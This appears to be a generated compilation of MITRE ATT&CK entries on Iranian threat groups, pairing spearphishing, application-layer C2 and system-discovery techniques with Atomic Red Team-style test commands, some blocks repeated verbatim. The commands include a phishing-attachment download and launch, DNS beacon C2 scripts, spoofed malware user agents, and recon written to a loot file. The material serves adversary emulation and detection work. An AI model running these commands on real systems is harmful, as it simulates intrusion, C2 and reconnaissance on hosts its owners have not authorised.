[OilRig](https://attack.mitre.org/groups/G0049) is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014. The group has targeted a variety of industries, including financial, government, energy, chemical, and telecommunications, and has largely focused its operations within the Middle East. It appears the group carries out supply chain attacks, leveraging the trust relationship between organizations to attack their primary targets. FireEye assesses that the group works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests. (Citation: Palo Alto OilRig April 2017) (Citation: ClearSky OilRig Jan 2017) (Citation: Palo Alto OilRig May 2016) (Citation: Palo Alto OilRig Oct 2016) (Citation: Unit 42 Playbook Dec 2017) (Citation: FireEye APT34 Dec 2017)(Citation: Unit 42 QUADAGENT July 2018) This group was previously tracked under two distinct groups, APT34 and OilRig, but was combined due to additional reporting giving higher confidence about the overlap of the activity.
```

## Actor Aliases

```
OilRig
IRN2
HELIX KITTEN
APT34
```

## Technique Name: Spearphishing Attachment

## Technique Description

```
Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution.

There are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.
```

## Technique Commands

```
if (-not(Test-Path HKLM:SOFTWARE\Classes\Excel.Application)){
  return 'Please install Microsoft Excel before running this test.'
}
else{
  $url = 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1193/bin/PhishingAttachment.xlsm'
  $fileName = 'PhishingAttachment.xlsm'
  New-Item -Type File -Force -Path $fileName | out-null
  $wc = New-Object System.Net.WebClient
  $wc.Encoding = [System.Text.Encoding]::UTF8
  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
  ($wc.DownloadString("$url")) | Out-File $fileName
}
Start-Process $PathToAtomicsFolder\T1193\bin\PowerShell_IP_Doc.doc
```



# Actor: APT39

## Actor Description

```
[APT39](https://attack.mitre.org/groups/G0087) is an Iranian cyber espionage group that has been active since at least 2014. They have targeted the telecommunication and travel industries to collect personal information that aligns with Iran's national priorities. (Citation: FireEye APT39 Jan 2019)(Citation: Symantec Chafer Dec 2015)
```

## Actor Aliases

```
APT39
Chafer
```

## Technique Name: Spearphishing Attachment

## Technique Description

```
Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution.

There are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.
```

## Technique Commands

```
if (-not(Test-Path HKLM:SOFTWARE\Classes\Excel.Application)){
  return 'Please install Microsoft Excel before running this test.'
}
else{
  $url = 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1193/bin/PhishingAttachment.xlsm'
  $fileName = 'PhishingAttachment.xlsm'
  New-Item -Type File -Force -Path $fileName | out-null
  $wc = New-Object System.Net.WebClient
  $wc.Encoding = [System.Text.Encoding]::UTF8
  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
  ($wc.DownloadString("$url")) | Out-File $fileName
}
Start-Process $PathToAtomicsFolder\T1193\bin\PowerShell_IP_Doc.doc
```



# Actor: APT33

## Actor Description

```
[APT33](https://attack.mitre.org/groups/G0064) is a suspected Iranian threat group that has carried out operations since at least 2013. The group has targeted organizations across multiple industries in the United States, Saudi Arabia, and South Korea, with a particular interest in the aviation and energy sectors. (Citation: FireEye APT33 Sept 2017) (Citation: FireEye APT33 Webinar Sept 2017)
```

## Actor Aliases

```
APT33
Elfin
```

## Technique Name: Spearphishing Link

## Technique Description

```
Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. 

All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Links may also direct users to malicious applications  designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, in order to gain access to protected applications and information.(Citation: Trend Micro Pawn Storm OAuth 2017)
```

## Technique Commands

```
```



# Actor: OilRig

## Actor Description

```
[OilRig](https://attack.mitre.org/groups/G0049) is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014. The group has targeted a variety of industries, including financial, government, energy, chemical, and telecommunications, and has largely focused its operations within the Middle East. It appears the group carries out supply chain attacks, leveraging the trust relationship between organizations to attack their primary targets. FireEye assesses that the group works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests. (Citation: Palo Alto OilRig April 2017) (Citation: ClearSky OilRig Jan 2017) (Citation: Palo Alto OilRig May 2016) (Citation: Palo Alto OilRig Oct 2016) (Citation: Unit 42 Playbook Dec 2017) (Citation: FireEye APT34 Dec 2017)(Citation: Unit 42 QUADAGENT July 2018) This group was previously tracked under two distinct groups, APT34 and OilRig, but was combined due to additional reporting giving higher confidence about the overlap of the activity.
```

## Actor Aliases

```
OilRig
IRN2
HELIX KITTEN
APT34
```

## Technique Name: Spearphishing Link

## Technique Description

```
Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. 

All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Links may also direct users to malicious applications  designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, in order to gain access to protected applications and information.(Citation: Trend Micro Pawn Storm OAuth 2017)
```

## Technique Commands

```
```



# Actor: Magic Hound

## Actor Description

```
[Magic Hound](https://attack.mitre.org/groups/G0059) is an Iranian-sponsored threat group operating primarily in the Middle East that dates back as early as 2014. The group behind the campaign has primarily targeted organizations in the energy, government, and technology sectors that are either based or have business interests in Saudi Arabia.(Citation: Unit 42 Magic Hound Feb 2017)(Citation: FireEye APT35 2018)
```

## Actor Aliases

```
Magic Hound
Rocket Kitten
Operation Saffron Rose
Ajax Security Team
Operation Woolen-Goldfish
Newscaster
Cobalt Gypsy
APT35
```

## Technique Name: Spearphishing Link

## Technique Description

```
Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. 

All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Links may also direct users to malicious applications  designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, in order to gain access to protected applications and information.(Citation: Trend Micro Pawn Storm OAuth 2017)
```

## Technique Commands

```
```



# Actor: APT39

## Actor Description

```
[APT39](https://attack.mitre.org/groups/G0087) is an Iranian cyber espionage group that has been active since at least 2014. They have targeted the telecommunication and travel industries to collect personal information that aligns with Iran's national priorities. (Citation: FireEye APT39 Jan 2019)(Citation: Symantec Chafer Dec 2015)
```

## Actor Aliases

```
APT39
Chafer
```

## Technique Name: Spearphishing Link

## Technique Description

```
Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. 

All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Links may also direct users to malicious applications  designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, in order to gain access to protected applications and information.(Citation: Trend Micro Pawn Storm OAuth 2017)
```

## Technique Commands

```
```



# Actor: Magic Hound

## Actor Description

```
[Magic Hound](https://attack.mitre.org/groups/G0059) is an Iranian-sponsored threat group operating primarily in the Middle East that dates back as early as 2014. The group behind the campaign has primarily targeted organizations in the energy, government, and technology sectors that are either based or have business interests in Saudi Arabia.(Citation: Unit 42 Magic Hound Feb 2017)(Citation: FireEye APT35 2018)
```

## Actor Aliases

```
Magic Hound
Rocket Kitten
Operation Saffron Rose
Ajax Security Team
Operation Woolen-Goldfish
Newscaster
Cobalt Gypsy
APT35
```

## Technique Name: Spearphishing via Service

## Technique Description

```
Spearphishing via service is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of third party services rather than directly via enterprise email channels. 

All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services. These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries will create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and software that's running in an environment. The adversary can then send malicious links or attachments through these services.

A common example is to build rapport with a target via social media, then send content to a personal webmail service that the target uses on their work computer. This allows an adversary to bypass some email restrictions on the work account, and the target is more likely to open the file since it's something they were expecting. If the payload doesn't work as expected, the adversary can continue normal communications and troubleshoot with the target on how to get it working.
```

## Technique Commands

```
```



# Actor: OilRig

## Actor Description

```
[OilRig](https://attack.mitre.org/groups/G0049) is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014. The group has targeted a variety of industries, including financial, government, energy, chemical, and telecommunications, and has largely focused its operations within the Middle East. It appears the group carries out supply chain attacks, leveraging the trust relationship between organizations to attack their primary targets. FireEye assesses that the group works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests. (Citation: Palo Alto OilRig April 2017) (Citation: ClearSky OilRig Jan 2017) (Citation: Palo Alto OilRig May 2016) (Citation: Palo Alto OilRig Oct 2016) (Citation: Unit 42 Playbook Dec 2017) (Citation: FireEye APT34 Dec 2017)(Citation: Unit 42 QUADAGENT July 2018) This group was previously tracked under two distinct groups, APT34 and OilRig, but was combined due to additional reporting giving higher confidence about the overlap of the activity.
```

## Actor Aliases

```
OilRig
IRN2
HELIX KITTEN
APT34
```

## Technique Name: Spearphishing via Service

## Technique Description

```
Spearphishing via service is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of third party services rather than directly via enterprise email channels. 

All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services. These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries will create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and software that's running in an environment. The adversary can then send malicious links or attachments through these services.

A common example is to build rapport with a target via social media, then send content to a personal webmail service that the target uses on their work computer. This allows an adversary to bypass some email restrictions on the work account, and the target is more likely to open the file since it's something they were expecting. If the payload doesn't work as expected, the adversary can continue normal communications and troubleshoot with the target on how to get it working.
```

## Technique Commands

```
```



# Actor: OilRig

## Actor Description

```
[OilRig](https://attack.mitre.org/groups/G0049) is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014. The group has targeted a variety of industries, including financial, government, energy, chemical, and telecommunications, and has largely focused its operations within the Middle East. It appears the group carries out supply chain attacks, leveraging the trust relationship between organizations to attack their primary targets. FireEye assesses that the group works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests. (Citation: Palo Alto OilRig April 2017) (Citation: ClearSky OilRig Jan 2017) (Citation: Palo Alto OilRig May 2016) (Citation: Palo Alto OilRig Oct 2016) (Citation: Unit 42 Playbook Dec 2017) (Citation: FireEye APT34 Dec 2017)(Citation: Unit 42 QUADAGENT July 2018) This group was previously tracked under two distinct groups, APT34 and OilRig, but was combined due to additional reporting giving higher confidence about the overlap of the activity.
```

## Actor Aliases

```
OilRig
IRN2
HELIX KITTEN
APT34
```

## Technique Name: Standard Application Layer Protocol

## Technique Description

```
Adversaries may communicate using a common, standardized application layer protocol such as HTTP, HTTPS, SMTP, or DNS to avoid detection by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.

For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are RPC, SSH, or RDP.
```

## Technique Commands

```
Invoke-WebRequest www.google.com -UserAgent "HttpBrowser/1.0" | out-null
Invoke-WebRequest www.google.com -UserAgent "Wget/1.9+cvs-stable (Red Hat modified)" | out-null
Invoke-WebRequest www.google.com -UserAgent "Opera/8.81 (Windows NT 6.0; U; en)" | out-null
Invoke-WebRequest www.google.com -UserAgent "*<|>*" | out-null
curl -s -A "HttpBrowser/1.0" -m3 www.google.com
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 www.google.com
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 www.google.com
curl -s -A "*<|>*" -m3 www.google.com
curl -s -A "HttpBrowser/1.0" -m3 www.google.com
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 www.google.com
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 www.google.com
curl -s -A "*<|>*" -m3 www.google.com
for($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type "TXT" "#{subdomain}.$(Get-Random -Minimum 1 -Maximum 999999).#{domain}" -QuickTimeout}
for($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type "TXT" "#{subdomain}.$(Get-Random -Minimum 1 -Maximum 999999).example.com" -QuickTimeout}
for($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type "#{query_type}" "atomicredteam.$(Get-Random -Minimum 1 -Maximum 999999).#{domain}" -QuickTimeout}
Set-Location $PathToAtomicsFolder
.\T1071\src\T1071-dns-beacon.ps1 -Domain example.com -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}
Set-Location $PathToAtomicsFolder
.\T1071\src\T1071-dns-beacon.ps1 -Domain example.com -Subdomain atomicredteam -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}
Set-Location $PathToAtomicsFolder
.\T1071\src\T1071-dns-beacon.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType TXT -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}
Set-Location $PathToAtomicsFolder
.\T1071\src\T1071-dns-domain-length.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType TXT
Set-Location $PathToAtomicsFolder
.\T1071\src\T1071-dns-domain-length.ps1 -Domain example.com -Subdomain #{subdomain} -QueryType TXT
Set-Location $PathToAtomicsFolder
.\T1071\src\T1071-dns-domain-length.ps1 -Domain #{domain} -Subdomain atomicredteamatomicredteamatomicredteamatomicredteamatomicredte -QueryType #{query_type}
```



# Actor: Magic Hound

## Actor Description

```
[Magic Hound](https://attack.mitre.org/groups/G0059) is an Iranian-sponsored threat group operating primarily in the Middle East that dates back as early as 2014. The group behind the campaign has primarily targeted organizations in the energy, government, and technology sectors that are either based or have business interests in Saudi Arabia.(Citation: Unit 42 Magic Hound Feb 2017)(Citation: FireEye APT35 2018)
```

## Actor Aliases

```
Magic Hound
Rocket Kitten
Operation Saffron Rose
Ajax Security Team
Operation Woolen-Goldfish
Newscaster
Cobalt Gypsy
APT35
```

## Technique Name: Standard Application Layer Protocol

## Technique Description

```
Adversaries may communicate using a common, standardized application layer protocol such as HTTP, HTTPS, SMTP, or DNS to avoid detection by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.

For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are RPC, SSH, or RDP.
```

## Technique Commands

```
Invoke-WebRequest www.google.com -UserAgent "HttpBrowser/1.0" | out-null
Invoke-WebRequest www.google.com -UserAgent "Wget/1.9+cvs-stable (Red Hat modified)" | out-null
Invoke-WebRequest www.google.com -UserAgent "Opera/8.81 (Windows NT 6.0; U; en)" | out-null
Invoke-WebRequest www.google.com -UserAgent "*<|>*" | out-null
curl -s -A "HttpBrowser/1.0" -m3 www.google.com
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 www.google.com
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 www.google.com
curl -s -A "*<|>*" -m3 www.google.com
curl -s -A "HttpBrowser/1.0" -m3 www.google.com
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 www.google.com
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 www.google.com
curl -s -A "*<|>*" -m3 www.google.com
for($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type "TXT" "#{subdomain}.$(Get-Random -Minimum 1 -Maximum 999999).#{domain}" -QuickTimeout}
for($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type "TXT" "#{subdomain}.$(Get-Random -Minimum 1 -Maximum 999999).example.com" -QuickTimeout}
for($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type "#{query_type}" "atomicredteam.$(Get-Random -Minimum 1 -Maximum 999999).#{domain}" -QuickTimeout}
Set-Location $PathToAtomicsFolder
.\T1071\src\T1071-dns-beacon.ps1 -Domain example.com -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}
Set-Location $PathToAtomicsFolder
.\T1071\src\T1071-dns-beacon.ps1 -Domain example.com -Subdomain atomicredteam -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}
Set-Location $PathToAtomicsFolder
.\T1071\src\T1071-dns-beacon.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType TXT -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}
Set-Location $PathToAtomicsFolder
.\T1071\src\T1071-dns-domain-length.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType TXT
Set-Location $PathToAtomicsFolder
.\T1071\src\T1071-dns-domain-length.ps1 -Domain example.com -Subdomain #{subdomain} -QueryType TXT
Set-Location $PathToAtomicsFolder
.\T1071\src\T1071-dns-domain-length.ps1 -Domain #{domain} -Subdomain atomicredteamatomicredteamatomicredteamatomicredteamatomicredte -QueryType #{query_type}
```



# Actor: APT33

## Actor Description

```
[APT33](https://attack.mitre.org/groups/G0064) is a suspected Iranian threat group that has carried out operations since at least 2013. The group has targeted organizations across multiple industries in the United States, Saudi Arabia, and South Korea, with a particular interest in the aviation and energy sectors. (Citation: FireEye APT33 Sept 2017) (Citation: FireEye APT33 Webinar Sept 2017)
```

## Actor Aliases

```
APT33
Elfin
```

## Technique Name: Standard Application Layer Protocol

## Technique Description

```
Adversaries may communicate using a common, standardized application layer protocol such as HTTP, HTTPS, SMTP, or DNS to avoid detection by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.

For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are RPC, SSH, or RDP.
```

## Technique Commands

```
Invoke-WebRequest www.google.com -UserAgent "HttpBrowser/1.0" | out-null
Invoke-WebRequest www.google.com -UserAgent "Wget/1.9+cvs-stable (Red Hat modified)" | out-null
Invoke-WebRequest www.google.com -UserAgent "Opera/8.81 (Windows NT 6.0; U; en)" | out-null
Invoke-WebRequest www.google.com -UserAgent "*<|>*" | out-null
curl -s -A "HttpBrowser/1.0" -m3 www.google.com
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 www.google.com
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 www.google.com
curl -s -A "*<|>*" -m3 www.google.com
curl -s -A "HttpBrowser/1.0" -m3 www.google.com
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 www.google.com
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 www.google.com
curl -s -A "*<|>*" -m3 www.google.com
for($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type "TXT" "#{subdomain}.$(Get-Random -Minimum 1 -Maximum 999999).#{domain}" -QuickTimeout}
for($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type "TXT" "#{subdomain}.$(Get-Random -Minimum 1 -Maximum 999999).example.com" -QuickTimeout}
for($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type "#{query_type}" "atomicredteam.$(Get-Random -Minimum 1 -Maximum 999999).#{domain}" -QuickTimeout}
Set-Location $PathToAtomicsFolder
.\T1071\src\T1071-dns-beacon.ps1 -Domain example.com -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}
Set-Location $PathToAtomicsFolder
.\T1071\src\T1071-dns-beacon.ps1 -Domain example.com -Subdomain atomicredteam -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}
Set-Location $PathToAtomicsFolder
.\T1071\src\T1071-dns-beacon.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType TXT -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}
Set-Location $PathToAtomicsFolder
.\T1071\src\T1071-dns-domain-length.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType TXT
Set-Location $PathToAtomicsFolder
.\T1071\src\T1071-dns-domain-length.ps1 -Domain example.com -Subdomain #{subdomain} -QueryType TXT
Set-Location $PathToAtomicsFolder
.\T1071\src\T1071-dns-domain-length.ps1 -Domain #{domain} -Subdomain atomicredteamatomicredteamatomicredteamatomicredteamatomicredte -QueryType #{query_type}
```



# Actor: OilRig

## Actor Description

```
[OilRig](https://attack.mitre.org/groups/G0049) is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014. The group has targeted a variety of industries, including financial, government, energy, chemical, and telecommunications, and has largely focused its operations within the Middle East. It appears the group carries out supply chain attacks, leveraging the trust relationship between organizations to attack their primary targets. FireEye assesses that the group works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests. (Citation: Palo Alto OilRig April 2017) (Citation: ClearSky OilRig Jan 2017) (Citation: Palo Alto OilRig May 2016) (Citation: Palo Alto OilRig Oct 2016) (Citation: Unit 42 Playbook Dec 2017) (Citation: FireEye APT34 Dec 2017)(Citation: Unit 42 QUADAGENT July 2018) This group was previously tracked under two distinct groups, APT34 and OilRig, but was combined due to additional reporting giving higher confidence about the overlap of the activity.
```

## Actor Aliases

```
OilRig
IRN2
HELIX KITTEN
APT34
```

## Technique Name: Standard Cryptographic Protocol

## Technique Description

```
Adversaries may explicitly employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if necessary secret keys are encoded and/or generated within malware samples/configuration files.
```

## Technique Commands

```
```



# Actor: APT33

## Actor Description

```
[APT33](https://attack.mitre.org/groups/G0064) is a suspected Iranian threat group that has carried out operations since at least 2013. The group has targeted organizations across multiple industries in the United States, Saudi Arabia, and South Korea, with a particular interest in the aviation and energy sectors. (Citation: FireEye APT33 Sept 2017) (Citation: FireEye APT33 Webinar Sept 2017)
```

## Actor Aliases

```
APT33
Elfin
```

## Technique Name: Standard Cryptographic Protocol

## Technique Description

```
Adversaries may explicitly employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if necessary secret keys are encoded and/or generated within malware samples/configuration files.
```

## Technique Commands

```
```



# Actor: OilRig

## Actor Description

```
[OilRig](https://attack.mitre.org/groups/G0049) is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014. The group has targeted a variety of industries, including financial, government, energy, chemical, and telecommunications, and has largely focused its operations within the Middle East. It appears the group carries out supply chain attacks, leveraging the trust relationship between organizations to attack their primary targets. FireEye assesses that the group works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests. (Citation: Palo Alto OilRig April 2017) (Citation: ClearSky OilRig Jan 2017) (Citation: Palo Alto OilRig May 2016) (Citation: Palo Alto OilRig Oct 2016) (Citation: Unit 42 Playbook Dec 2017) (Citation: FireEye APT34 Dec 2017)(Citation: Unit 42 QUADAGENT July 2018) This group was previously tracked under two distinct groups, APT34 and OilRig, but was combined due to additional reporting giving higher confidence about the overlap of the activity.
```

## Actor Aliases

```
OilRig
IRN2
HELIX KITTEN
APT34
```

## Technique Name: System Information Discovery

## Technique Description

```
An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from [System Information Discovery](https://attack.mitre.org/techniques/T1082) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

### Windows

Example commands and utilities that obtain this information include <code>ver</code>, [Systeminfo](https://attack.mitre.org/software/S0096), and <code>dir</code> within [cmd](https://attack.mitre.org/software/S0106) for identifying information based on present files and directories.

### Mac

On Mac, the <code>systemsetup</code> command gives a detailed breakdown of the system, but it requires administrative privileges. Additionally, the <code>system_profiler</code> gives a very detailed breakdown of configurations, firewall rules, mounted volumes, hardware, and many other things without needing elevated permissions.

### AWS

In Amazon Web Services (AWS), the Application Discovery Service may be used by an adversary to identify servers, virtual machines, software, and software dependencies running.(Citation: Amazon System Discovery)

### GCP

On Google Cloud Platform (GCP) <code>GET /v1beta1/{parent=organizations/*}/assets</code> or <code>POST /v1beta1/{parent=organizations/*}/assets:runDiscovery</code> may be used to list an organizations cloud assets, or perform asset discovery on a cloud environment.(Citation: Google Command Center Dashboard)

### Azure

In Azure, the API request <code>GET https://management.azure.com/subscriptions/{subscriptionId}/resourceGroups/{resourceGroupName}/providers/Microsoft.Compute/virtualMachines/{vmName}?api-version=2019-03-01</code> may be used to retrieve information about the model or instance view of a virtual machine.(Citation: Microsoft Virutal Machine API)
```

## Technique Commands

```
ver
shell ver
set
shell set
get_env.rb
net config workstation
net config server
shell net config workstation
shell net config server
systeminfo [/s COMPNAME] [/u DOMAIN\user] [/p password]
systemprofiler tool if no access yet (victim browses to website)
or
shell systeminfo (if you already have a beacon)
sysinfo, run winenum, get_env.rb
systeminfo
reg query HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum
systemsetup
system_profiler
ls -al /Applications
uname -a >> /tmp/loot.txt
cat /etc/lsb-release >> /tmp/loot.txt
cat /etc/redhat-release >> /tmp/loot.txt
uptime >> /tmp/loot.txt
cat /etc/issue >> /tmp/loot.txt
cat /sys/class/dmi/id/bios_version | grep -i amazon
cat /sys/class/dmi/id/product_name | grep -i "Droplet\|HVM\|VirtualBox\|VMware"
cat /sys/class/dmi/id/chassis_vendor | grep -i "Xen\|Bochs\|QEMU"
sudo dmidecode | grep -i "microsoft\|vmware\|virtualbox\|quemu\|domu"
cat /proc/scsi/scsi | grep -i "vmware\|vbox"
cat /proc/ide/hd0/model | grep -i "vmware\|vbox\|qemu\|virtual"
sudo lspci | grep -i "vmware\|virtualbox"
sudo lscpu | grep -i "Xen\|KVM\|Microsoft"
sudo lsmod | grep -i "vboxsf\|vboxguest"
sudo lsmod | grep -i "vmw_baloon\|vmxnet"
sudo lsmod | grep -i "xen-vbd\|xen-vnif"
sudo lsmod | grep -i "virtio_pci\|virtio_net"
sudo lsmod | grep -i "hv_vmbus\|hv_blkvsc\|hv_netvsc\|hv_utils\|hv_storvsc"
